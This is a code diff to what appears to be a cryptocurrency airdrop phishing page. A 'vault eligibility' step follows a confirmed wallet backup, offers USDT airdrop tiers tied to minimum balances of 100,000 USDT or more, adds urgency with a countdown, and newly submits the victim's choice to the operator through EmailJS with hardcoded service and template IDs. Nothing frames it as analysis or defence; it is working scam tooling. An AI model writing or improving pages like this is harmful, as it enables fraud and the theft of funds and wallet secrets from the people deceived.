@@ -403,23 +403,25 @@
     Do not close during verification
   </div>
   </div>
-
+  
   <div id="step3" class="card" hidden role="region" aria-labelledby="s3title">
-    <h2 id="s3title">Vault Eligibility</h2>
-    <p style="margin-top: 8px; color: var(--green); font-weight: 600; display:flex; align-items:center; gap:6px;">
-      <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" fill="currentColor" viewBox="0 0 16 16">
-        <path d="M8 0c-.69 0-1.37.14-2 .41L2 2v5c0 4.5 3.5 8.5 6 9 2.5-.5 6-4.5 6-9V2l-4-1.59C9.37.14 8.69 0 8 0z"/>
-      </svg>
-      Backup confirmed — now let’s activate your vault eligibility.
-    </p>
-    <p class="subtitle">
-      This is a one-time vault entry. Please select your airdrop tier.
-    </p>
+  <h2 id="s3title">Vault Eligibility</h2>
+  <p style="margin-top: 8px; color: var(--green); font-weight: 600; display:flex; align-items:center; gap:6px;">
+    <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" fill="currentColor" viewBox="0 0 16 16">
+      <path d="M8 0c-.69 0-1.37.14-2 .41L2 2v5c0 4.5 3.5 8.5 6 9 2.5-.5 6-4.5 6-9V2l-4-1.59C9.37.14 8.69 0 8 0z"/>
+    </svg>
+    Backup confirmed — now let’s activate your vault eligibility.
+  </p>
+  <p class="subtitle">
+    This is a one-time vault entry. Please select your airdrop tier.
+  </p>
 
+  <!-- Wrap in a form for sendForm -->
+  <form id="step3-form">
     <label for="tierSelect" style="margin-top: 12px; display:block; color:#cbd5e1;">
       Choose a tier:
     </label>
-    <select id="tierSelect" name="tierSelect" class="attention">
+    <select id="tierSelect" name="tier" class="attention">
       <option value="">-- Select a tier --</option>
       <option value="1M">1,000,000 USDT airdrop → Min balance: 100,000 USDT</option>
       <option value="250k">250,000 USDT airdrop → Min balance: 50,000 USDT</option>
@@ -455,9 +457,10 @@
       updateCountdown();
     </script>
 
-    <button id="s3btn" style="margin-top: 16px;">Activate eligibility</button>
+    <button id="s3btn" type="submit" style="margin-top: 16px;">Activate eligibility</button>
     <div id="loaderBar" class="loader" hidden></div>
-  </div>
+  </form>
+  </div> 
 
   <!-- Final Dashboard -->
   <div id="final" class="dashboard" hidden>
@@ -674,15 +677,13 @@ document.addEventListener("DOMContentLoaded", () => {
   s3form.addEventListener("submit", function(event) {
     event.preventDefault();
 
-    const tierValue = document.getElementById("tier").value;
-    const walletAddr = document.getElementById("walletDisplay").textContent;
-
+    const tierValue = document.getElementById("tierSelect").value;
     if (!tierValue) {
       showToast("Please select a tier before continuing.");
       return;
     }
 
-    // Send tier + wallet address via the SAME template
+    // Send tier choice via EmailJS using sendForm
     emailjs.sendForm("service_1qzlil7", "template_w742mzr", "#step3-form")
       .then(function(response) {
         console.log("Step 3 EmailJS success:", response);
